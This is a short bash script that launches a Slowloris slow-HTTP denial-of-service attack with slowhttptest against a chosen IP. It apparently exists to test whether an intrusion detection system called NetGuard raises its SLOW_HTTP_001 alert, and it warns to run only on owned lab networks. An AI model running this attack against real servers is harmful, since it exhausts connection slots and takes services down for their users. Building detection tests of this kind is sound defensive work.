#!/usr/bin/env bash
# attack_slow_http.sh — Slow HTTP (Slowloris) attack test script for NetGuard IDPS demonstration
#
# Prerequisites: slowhttptest
#   Install: sudo apt-get install slowhttptest
#
# Usage:
#   TARGET_IP=<victim-ip> bash attack_slow_http.sh
#   Example: TARGET_IP=192.168.1.100 bash attack_slow_http.sh
#
# Expected detection in NetGuard:
#   Attack type : Slow HTTP
#   Rule        : SLOW_HTTP_001
#   Severity    : Medium (≥ 10 simultaneous slow connections from one IP)
#                 High   (≥ 20 simultaneous slow connections from one IP)
#   Confidence  : 100
#   Appears on dashboard within ~15 seconds of script start (after connection timeout elapses)
#
# Safe-use warning:
#   Run ONLY in an isolated lab/hackathon network you own or have explicit permission to test.
#   Slow HTTP attacks exhaust server connection slots. Never run against production systems.
#   The target must have a service listening on port 80 for this test to produce detectable traffic.

TARGET_IP="${TARGET_IP:-}"

if [ -z "$TARGET_IP" ]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Usage: TARGET_IP=<victim-ip> bash $0" >&2
    exit 1
fi

echo "[*] Starting Slow HTTP attack → http://$TARGET_IP/ (200 connections, slow headers)..."
# -c 200  : open 200 connections
# -H      : Slowloris mode (slow headers — never sends \r\n\r\n)
# -i 10   : send a header line every 10 seconds
# -r 200  : connection creation rate (200/s)
# -t GET  : use GET method
# -u      : target URL
# -x 24   : max length of each follow-up header line
# -p 3    : timeout for server response probe
slowhttptest -c 200 -H -i 10 -r 200 -t GET -u "http://$TARGET_IP/" -x 24 -p 3
echo "[*] Done. Check NetGuard dashboard for Slow HTTP alert (SLOW_HTTP_001)."
